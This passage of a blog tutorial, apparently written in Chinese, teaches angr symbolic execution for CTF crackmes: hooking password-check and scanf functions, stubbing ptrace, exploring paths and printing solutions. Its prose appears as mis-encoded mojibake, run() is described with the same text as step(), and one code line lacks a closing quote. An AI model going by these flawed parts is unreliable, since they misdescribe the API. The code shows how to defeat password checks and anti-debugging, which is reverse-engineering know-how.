class="comment">#è®¾ç½®è¿”å›çš„å¯„å­˜å™¨ï¼Œåªè¿”å›ç»™äº†eaxå¯„å­˜å™¨ï¼Œæ‰€ä»¥åªéœ€è¦è®¾ç½®eaxå¯„å­˜å™¨</span></span><br><span class="line">    register_size_bit = <span class="number">32</span></span><br><span class="line">    state.regs.eax = claripy.If(</span><br><span class="line">        user_input_string == check_against_string,</span><br><span class="line">        claripy.BVV(<span class="number">1</span>, register_size_bit),</span><br><span class="line">        claripy.BVV(<span class="number">0</span>, register_size_bit)</span><br><span class="line">    )</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-åˆ©ç”¨å‡½æ•°åè¿›è¡Œhook"   >
          <a href="#2-åˆ©ç”¨å‡½æ•°åè¿›è¡Œhook" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨å‡½æ•°åè¿›è¡Œhook" class="headerlink" title="(2)åˆ©ç”¨å‡½æ•°åè¿›è¡Œhook"></a>(2)åˆ©ç”¨å‡½æ•°åè¿›è¡Œhook</h3>
      <p>å½“å‡½æ•°è¢«è°ƒç”¨äº†å¤šæ¬¡ï¼Œè€Œæˆ‘ä»¬åˆéœ€è¦å¯¹æ¯ä¸€ä¸ªè¿™ä¸ªå‡½æ•°è¿›è¡Œhookæ—¶ï¼Œå°±å¯ä»¥é€šè¿‡å‡½æ•°åè¿›è¡Œhook</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">check_equals_ORSDDWXHZURJRBDH</span><span class="params">(<span class="keyword">char</span> *to_check, <span class="keyword">unsigned</span> <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( to_check[i] == *(_BYTE *)(i + <span class="number">0x804C048</span>) )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ¯”å¦‚æ›¿æ¢ä¸Šè¿°çš„å‡½æ•°</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReplacementCheckEquals</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, to_check, length</span>):</span></span><br><span class="line">        <span class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">        user_input_buffer_address = to_check</span><br><span class="line">        <span class="comment">#ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line">        user_input_buffer_length = length</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#ä¾æ®å‚æ•°è·å–è¾“å…¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line">        user_input_string = self.state.memory.load(</span><br><span class="line">            user_input_buffer_address,</span><br><span class="line">            user_input_buffer_length)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#æ‰§è¡Œæ¯”è¾ƒåŠŸèƒ½å¹¶è¿”å›</span></span><br><span class="line">        check_against_string = <span class="string">&#x27;ORSDDWXHZURJRBDH&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> claripy.If(</span><br><span class="line">            user_input_string == check_against_string,</span><br><span class="line">            claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),</span><br><span class="line">            claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">check_equals_symbol = <span class="string">&#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span></span><br><span class="line">project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦å°±æ˜¯å®šä¹‰ä¸€ä¸ªç±»ï¼Œå°†æ‰€æœ‰å‡½æ•°åç§°ä¸ºcheck_equals_ORSDDWXHZURJRBDHçš„å‡½æ•°ç”¨ç±»ReplacementCheckEqualsä¸­çš„runå‡½æ•°æ›¿æ¢</p>

        <h3 id="3-Hookæ‰Scanfå‡½æ•°"   >
          <a href="#3-Hookæ‰Scanfå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Hookæ‰Scanfå‡½æ•°" class="headerlink" title="(3)Hookæ‰Scanfå‡½æ•°"></a>(3)Hookæ‰Scanfå‡½æ•°</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, param0, param1</span>):</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#è®¾ç½®è¦å­˜å…¥å¯¹åº”å‚æ•°å†…å­˜ä¸­çš„æ•°æ®</span></span><br><span class="line">        scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#è·å–éœ€è¦å­˜å…¥çš„å†…å­˜åœ°å€ï¼Œç„¶åä»¥ç¬¦å·å‘é‡çš„å½¢å¼å­˜å‚¨è¿›å»</span></span><br><span class="line">        scanf0_address = param0</span><br><span class="line">        self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">        scanf1_address = param1</span><br><span class="line">        self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#å°†ä¸¤ä¸ªå‘é‡æ•°æ®è®¾ç½®ä¸ºå…¨å±€çš„ï¼Œæ–¹ä¾¿ä¹‹åæ±‚è§£æ‰“å°</span></span><br><span class="line">        self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (scanf0, scanf1)</span><br><span class="line">scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line"></span><br><span class="line">project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-Hooké™æ€åº“å‡½æ•°"   >
          <a href="#4-Hooké™æ€åº“å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Hooké™æ€åº“å‡½æ•°" class="headerlink" title="(4)Hooké™æ€åº“å‡½æ•°"></a>(4)Hooké™æ€åº“å‡½æ•°</h3>
      <p>å½“ç¨‹åºä½¿ç”¨é™æ€ç¼–è¯‘æ—¶ï¼Œå¯èƒ½éœ€è¦Hookä¸€äº›é™æ€åº“å‡½æ•°</p>
<p>åœ¨æ¢ç´¢å¼€å§‹ä¹‹å‰æ·»åŠ å³å¯</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">project.hook(<span class="number">0x804ed40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">project.hook(<span class="number">0x804ed80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">project.hook(<span class="number">0x804f350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">project.hook(<span class="number">0x8048d10</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br></pre></td></tr></table></div></figure>


        <h3 id="5-å¤„ç†å‡½æ•°åœ¨å¤–éƒ¨åº“soä¸­"   >
          <a href="#5-å¤„ç†å‡½æ•°åœ¨å¤–éƒ¨åº“soä¸­" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å¤„ç†å‡½æ•°åœ¨å¤–éƒ¨åº“soä¸­" class="headerlink" title="(5)å¤„ç†å‡½æ•°åœ¨å¤–éƒ¨åº“soä¸­"></a>(5)å¤„ç†å‡½æ•°åœ¨å¤–éƒ¨åº“soä¸­</h3>
      <p>å½“ç¨‹åºå¯¹äºflagçš„åŠ è§£å¯†å¤„ç†å‡½æ•°åœ¨å¤–éƒ¨åº“ä¸­æ—¶ï¼Œè¿™æ—¶å€™å¯ä»¥ç›´æ¥è°ƒç”¨å¤–éƒ¨åº“ä¸­çš„å‡½æ•°è¿›è¡Œç¬¦å·æ‰§è¡Œ</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å› ä¸ºåº“å‡½æ•°åŠ¨æ€åŠ è½½ï¼Œæ‰€ä»¥éœ€è¦æŒ‡å®šåç§»</span></span><br><span class="line">base = <span class="number">0x4000000</span></span><br><span class="line">project = angr.Project(path_to_binary, load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123;<span class="string">&#x27;custom_base_addr&#x27;</span> : base&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸ºè¾“å…¥å‚æ•°åˆ›å»ºå†…å­˜å‘é‡çš„åœ°å€</span></span><br><span class="line">buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾ç½®éœ€è¦è°ƒç”¨çš„å‡½æ•°åœ°å€</span></span><br><span class="line">validate_function_address = base + <span class="number">0x6d7</span></span><br><span class="line"><span class="comment">#è®¾ç½®çŠ¶æ€ï¼Œè°ƒç”¨å‡½æ•°</span></span><br><span class="line">initial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#è£…è½½å†…å­˜å‘é‡è¿›å…¥åœ°å€æŒ‡é’ˆä¸­</span></span><br><span class="line">password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">initial_state.memory.store(buffer_pointer, password)</span><br></pre></td></tr></table></div></figure>

<p><code>main_opts</code>ä¸ºä¸»ç¨‹åºæŒ‡å®šåŠ è½½å‚æ•°ï¼Œå¸¸ç”¨ä»¥ä¸‹å‚æ•°</p>
<ul>
<li>custom_base_addr â€”â€” ä½¿ç”¨çš„åŸºåœ°å€</li>
<li>custom_entry_point â€”â€” ä½¿ç”¨çš„å…¥å£ç‚¹</li>
<li>custom_arch â€”â€” ä½¿ç”¨çš„å¤„ç†å™¨ä½“ç³»ç»“æ„çš„åå­—</li>
</ul>
<p>è¿™æ ·åœ¨ä¹‹åçš„è®¾ç½®æˆåŠŸåœ°å€ä¹Ÿéœ€è¦ç”¨åˆ°<code>base</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">success_address = base + <span class="number">0x783</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="6-å¿«é€Ÿhook"   >
          <a href="#6-å¿«é€Ÿhook" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-å¿«é€Ÿhook" class="headerlink" title="(6)å¿«é€Ÿhook"></a>(6)å¿«é€Ÿhook</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_Normal</span>(<span class="params">state</span>):</span></span><br><span class="line">    state.regs.rax = <span class="number">8</span></span><br><span class="line">p.hook(<span class="number">0x40168e</span>, hook_Normal, length=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–è€…</span></span><br><span class="line">p.hook_symbol(<span class="string">&#x27;ptrace&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;stubs&#x27;</span>][<span class="string">&#x27;ReturnUnconstrained&#x27;</span>](return_value=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç›´æ¥pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_0</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="5-å¼€å§‹æ¢ç´¢"   >
          <a href="#5-å¼€å§‹æ¢ç´¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å¼€å§‹æ¢ç´¢" class="headerlink" title="5.å¼€å§‹æ¢ç´¢"></a>5.å¼€å§‹æ¢ç´¢</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation.explore(find=is_successful, avoid=should_abort)</span><br></pre></td></tr></table></div></figure>

<p><code>simulation.explore</code>è¡¨å¼€å§‹æ¢ç´¢ï¼Œè¯•å›¾è¿›å…¥åˆ°<code>print_good_address</code>ä¸­</p>

        <h3 id="â–²veritestingæ¨¡å¼"   >
          <a href="#â–²veritestingæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²veritestingæ¨¡å¼" class="headerlink" title="â–²veritestingæ¨¡å¼"></a>â–²veritestingæ¨¡å¼</h3>
      <p>è¯¥æ¨¡å¼å¯ä»¥å¯¹è·¯å¾„çˆ†ç‚¸è¿›è¡Œä¸€äº›è§£å†³</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/251984" >https://www.anquanke.com/post/id/251984</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä½†æ˜¯åœ¨éœ€è¦æ¢ç´¢æ‰€æœ‰è·¯å¾„çš„æ—¶å€™ï¼Œveritestingä¼šå‡ºé”™ï¼Œå°†ä¸€äº›è·¯å¾„åˆå¹¶ï¼Œä»è€Œæ— æ³•æŠµè¾¾æ­£ç¡®çš„deadendè·¯å¾„ï¼Œè¯¦è§<code>csaw_wyvern/wyvern</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation = project.factory.simgr(initial_state, veritesting=<span class="literal">True</span>)</span><br></pre></td></tr></table></div></figure>




        <h2 id="6-è¾“å‡ºç­”æ¡ˆ"   >
          <a href="#6-è¾“å‡ºç­”æ¡ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-è¾“å‡ºç­”æ¡ˆ" class="headerlink" title="6.è¾“å‡ºç­”æ¡ˆ"></a>6.è¾“å‡ºç­”æ¡ˆ</h2>
      
        <h3 id="1-ç¬¦å·è¾“å‡º"   >
          <a href="#1-ç¬¦å·è¾“å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç¬¦å·è¾“å‡º" class="headerlink" title="(1)ç¬¦å·è¾“å‡º"></a>(1)ç¬¦å·è¾“å‡º</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution.decode(<span class="string">&quot;utf-8&quot;</span>)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å³è·å–æ‰¾åˆ°çš„ç¬¬ä¸€ä¸²ç¬¦å·ï¼Œç„¶åè¾“å‡º</p>

        <h3 id="2-ä½å‘é‡è¾“å‡º"   >
          <a href="#2-ä½å‘é‡è¾“å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä½å‘é‡è¾“å‡º" class="headerlink" title="(2)ä½å‘é‡è¾“å‡º"></a>(2)ä½å‘é‡è¾“å‡º</h3>
      <p>è¿™ä¸ªä¸€èˆ¬åœ¨æœ€å¼€å§‹ä½¿ç”¨ä½å‘é‡BVSåˆ›å»ºè¾“å…¥çš„æ—¶å€™ä½¿ç”¨</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#passwd0 = claripy.BVS(&#x27;passwd0&#x27;, passwd_size_in_bits)</span></span><br><span class="line"><span class="comment">#passwd1 = claripy.BVS(&#x27;passwd1&#x27;, passwd_size_in_bits)</span></span><br><span class="line"><span class="comment">#passwd2 = claripy.BVS(&#x27;passwd2&#x27;, passwd_size_in_bits)</span></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="keyword">for</span> solution_state <span class="keyword">in</span> simulation.found:</span><br><span class="line">        solution0 = <span class="built_in">format</span>(solution_state.solver.<span class="built_in">eval</span>(passwd0), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        solution1 = <span class="built_in">format</span>(solution_state.solver.<span class="built_in">eval</span>(passwd1), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        solution2 = <span class="built_in">format</span>(solution_state.solver.<span class="built_in">eval</span>(passwd2), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        solution = solution0 + <span class="string">&quot; &quot;</span> + solution1 + <span class="string">&quot; &quot;</span> + solution2</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution))</span><br><span class="line">        <span class="comment"># print(simgr.found[0].posix.dumps(0))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></div></figure>

<p>è¾“å‡ºçš„æ˜¯åå…­è¿›åˆ¶çš„æ•°å­—</p>

        <h3 id="3-æ±‚è§£é€‰é¡¹"   >
          <a href="#3-æ±‚è§£é€‰é¡¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ±‚è§£é€‰é¡¹" class="headerlink" title="(3)æ±‚è§£é€‰é¡¹"></a>(3)æ±‚è§£é€‰é¡¹</h3>
      <div class="table-container"><table>
<thead>
<tr>
<th>æ¥å£</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><code>solver.eval(expression)</code></td>
<td>å°†ä¼šè§£å‡ºä¸€ä¸ªå¯è¡Œè§£</td>
</tr>
<tr>
<td><code>solver.eval_one(expression)</code></td>
<td>å°†ä¼šç»™å‡ºä¸€ä¸ªè¡¨è¾¾å¼çš„å¯è¡Œè§£ï¼Œè‹¥æœ‰å¤šä¸ªå¯è¡Œè§£ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸</td>
</tr>
<tr>
<td><code>solver.eval_upto(expression, n)</code></td>
<td>å°†ä¼šç»™å‡ºæœ€å¤šnä¸ªå¯è¡Œè§£ï¼Œå¦‚æœä¸è¶³nä¸ªå°±ç»™å‡ºæ‰€æœ‰çš„å¯è¡Œè§£ã€‚</td>
</tr>
<tr>
<td><code>solver.eval_exact(expression, n)</code></td>
<td>å°†ä¼šç»™å‡ºnä¸ªå¯è¡Œè§£ï¼Œå¦‚æœè§£çš„ä¸ªæ•°ä¸ç­‰äºnä¸ªï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</td>
</tr>
<tr>
<td><code>solver.min(expression)</code></td>
<td>ç»™å‡ºæœ€å°å¯è¡Œè§£</td>
</tr>
<tr>
<td><code>solver.max(expression)</code></td>
<td>ç»™å‡ºæœ€å¤§å¯è¡Œè§£</td>
</tr>
</tbody></table></div>

        <h1 id="äºŒã€è¿›é˜¶ç®¡ç†"   >
          <a href="#äºŒã€è¿›é˜¶ç®¡ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€è¿›é˜¶ç®¡ç†" class="headerlink" title="äºŒã€è¿›é˜¶ç®¡ç†"></a>äºŒã€è¿›é˜¶ç®¡ç†</h1>
      <p>Stash:  active ã€deadend ã€foundç­‰</p>

        <h2 id="1-è¿è¡Œæ–¹å¼"   >
          <a href="#1-è¿è¡Œæ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è¿è¡Œæ–¹å¼" class="headerlink" title="1.è¿è¡Œæ–¹å¼"></a>1.è¿è¡Œæ–¹å¼</h2>
      <p>åŸºæœ¬å—çš„åŒºåˆ†é€šå¸¸ä»¥<code>call</code>ï¼Œ<code>cmp-jz/jmp...</code>ï¼Œ<code>ret</code>ç­‰ä¸ºæ ‡å¿—ã€‚</p>

        <h3 id="1-step"   >
          <a href="#1-step" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-step" class="headerlink" title="(1)step()"></a>(1)step()</h3>
      <p>æ¯æ¬¡å‘å‰è¿è¡Œä¸€ä¸ªåŸºæœ¬å—ï¼Œå¹¶è¿”å›è¿›è¡Œåˆ†ç±»</p>
<p>è®© stash ä¸­çš„æ‰€æœ‰çŠ¶æ€éƒ½æ‰§è¡Œä¸€ä¸ªåŸºæœ¬å—ï¼Œé»˜è®¤çš„ stash ä¸º active</p>

        <h3 id="2-run"   >
          <a href="#2-run" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-run" class="headerlink" title="(2)run()"></a>(2)run()</h3>
      <p>æ¯æ¬¡å‘å‰è¿è¡Œä¸€ä¸ªåŸºæœ¬å—ï¼Œå¹¶è¿”å›è¿›è¡Œåˆ†ç±»</p>

        <h3 id="3-explore"   >
          <a href="#3-explore" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-explore" class="headerlink" title="(3)explore()"></a>(3)explore()</h3>
      <p>æ ¹æ®<code>find</code>å’Œ<code>avoid</code>è¿›è¡ŒåŸºæœ¬å—çš„æ‰§è¡Œï¼Œæœ€åä¼šè¿”å›<code>found</code>å’Œ<code>avoid</code>çŠ¶æ€</p>

        <h2 id="2-è·¨å¹³å°ä½¿ç”¨"   >
          <a href="#2-è·¨å¹³å°ä½¿ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è·¨å¹³å°ä½¿ç”¨" class="headerlink" title="2.è·¨å¹³å°ä½¿ç”¨"></a>2.è·¨å¹³å°ä½¿ç”¨</h2>
      
        <h3 id="1-ARM"   >
          <a href="#1-ARM" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ARM" class="headerlink" title="(1)ARM"></a>(1)ARM</h3>
      <p>ç›´æ¥å¯¹åº”ä½¿ç”¨ï¼Œä¸ç”¨æ·»åŠ å…¶ä»–çš„ä»€ä¹ˆé…ç½®</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state.regs.r0 = concrete_addr</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-ç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶é‡Œçš„å‡½æ•°"   >
          <a href="#3-ç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶é‡Œçš„å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶é‡Œçš„å‡½æ•°" class="headerlink" title="3.ç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶é‡Œçš„å‡½æ•°"></a>3.ç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶é‡Œçš„å‡½æ•°</h2>
      <p>æ–‡ä»¶åœ¨â€/home/hacker/Desktop/Reverse/Angr/myTest/callBinaryFuncâ€</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#myFuncå‡½æ•°çš„åœ°å€ï¼Œå³å‡½æ•°æœ€å¼€å§‹çš„æ±‡ç¼–ä»£ç çš„åœ°å€</span></span><br><span class="line">myFunc_addr = base + <span class="number">0x64A</span></span><br><span class="line">project = angr.Project(path_to_binary, auto_load_libs=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#(SimTypeInt(False)è¡¨è®¾ç½®å‚æ•°ï¼Œä¼ å‚å’Œè¿”å›å€¼çš„ç±»å‹è®¾ç½®</span></span><br><span class="line">prototype = SimTypeFunction((SimTypeInt(<span class="literal">False</span>),SimTypeInt(<span class="literal">False</span>)),SimTypeInt(<span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">myFunc = project.factory.<span class="built_in">callable</span>(myFunc_addr, cc=project.factory.cc(func_ty=prototype), toc=<span class="literal">None</span>, concrete_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨å‡½æ•°</span></span><br><span class="line">myFunc.perform_call(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è·å–æœ€ç»ˆçš„çŠ¶æ€state,å³å¯ä»è¯¥stateä¸­è·å–è¿”å›å€¼å’Œå„ç§å¯„å­˜å™¨çŠ¶æ€</span></span><br><span class="line">state = myFunc.result_state</span><br><span class="line"><span class="built_in">print</span>(state.regs.rax)</span><br></pre></td></tr></table></div></figure>

<p>æˆ–è€…å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func = project.factory.callable(project.loader.find_symbol(&#x27;myFunc).rebased_addr)</span><br></pre></td></tr></table></div></figure>




        <h2 id="4-C-åº“çš„å®ç°"   >
          <a href="#4-C-åº“çš„å®ç°" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-C-åº“çš„å®ç°" class="headerlink" title="4.C++åº“çš„å®ç°"></a>4.C++åº“çš„å®ç°</h2>
      <p>åªèƒ½ä»æœ€å¼€å§‹è¿›è¡Œ</p>
<p>ç”±äº<code>angr</code>æ˜¯åªå®ç°äº†Cåº“ï¼Œä¸ºäº†æ·±å…¥C++æ ‡å‡†åº“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è®¾ç½®stateæ—¶éœ€è¦ä½¿ç”¨<code>full_init_state</code>æ–¹æ³•ï¼Œå¹¶ä¸”è®¾ç½®<code>unicorn</code>å¼•æ“</p>
